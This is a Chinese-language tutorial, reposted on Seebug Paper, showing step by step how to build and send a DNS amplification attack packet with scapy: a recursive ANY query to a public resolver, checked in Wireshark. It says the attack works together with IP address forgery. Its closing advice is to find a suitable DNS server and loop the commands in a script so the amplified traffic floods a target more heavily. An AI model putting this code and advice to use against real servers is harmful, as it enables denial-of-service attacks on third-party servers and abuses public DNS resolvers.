本文来自i春秋作者： [即刻安全](http://bbs.ichunqiu.com/thread-12685-1-1.html?from=paper)

#### 前言：

今天为大家介绍DNS放大攻击。通过DNS服务器的递归查询，我们可以利用少量的查询流量，来获得大量的返回数据流量。该攻击方式需要结合IP地址伪造，同时需要DNS服务器支持递归查询。下面我们来看看，如何实现攻击？

#### 0x00

首先，我们用 scapy 来构造一个完整的DNS查询数据包。

    
    
    i=IP()
    i.display()

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/28/135325zk11vvk1kvvehzsa.png)

#### 0x01

修改目标DNS地址。

    
    
    i.dst="8.8.8.8"
    
    i.display()

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/28/135326koeydouemyzezlzw.png)

#### 0x02

定义UDP包。

    
    
    u=UDP()
    u.display()

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/28/135327uww66az9a88ks6qp.png)

#### 0x03

定义DNS包。

    
    
    d=DNS()
    d.rd=1
    d.qdcount=1
    d.display()

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/28/135329wrchcr5271fl2gns.png)

#### 0x04

设置DNS查询内容。

    
    
    q=DNSQR()
    q.qname="xxxxx.com"
    q.qtype=255
    q.display()

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/28/135329q83ua83wfff06nn0.png)

#### 0x05

    
    
    d.qd=q (把查询内容赋给DNS的qd)
    r=(i/u/d)
    d.display()

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/28/135331wzb6joedjt44xabg.png)

#### 0x06

最后我们来发送我们构建的数据包。

sr1(r)

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/28/135332skl9h19h11rh1gk0.png)

#### 0x07

我们打开 wireshark 来进行抓包。

![](http://bbs.ichunqiu.com/data/attachment/forum/201609/28/135334r0n2cnns0su4z01h.png)

#### 后序：

通过 wireshark 的抓包我们可以看到，我们查询时发送的数据包为 68
字节，但响应包为118字节。这样就实现了，通过返回的大流量来达到对目标服务器的DDoS效果！当然这里返回的流量还不够巨大，原因在于DNS服务器做了一定的限制。只要找到合适的DNS服务器，并将以上命令写入脚本中循环执行，那么效果将更加明显！下面是我们即刻安全的微信公众号，欢迎大家关注！！

原文地址：http://bbs.ichunqiu.com/thread-12685-1-1.html?from=paper

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/60/>

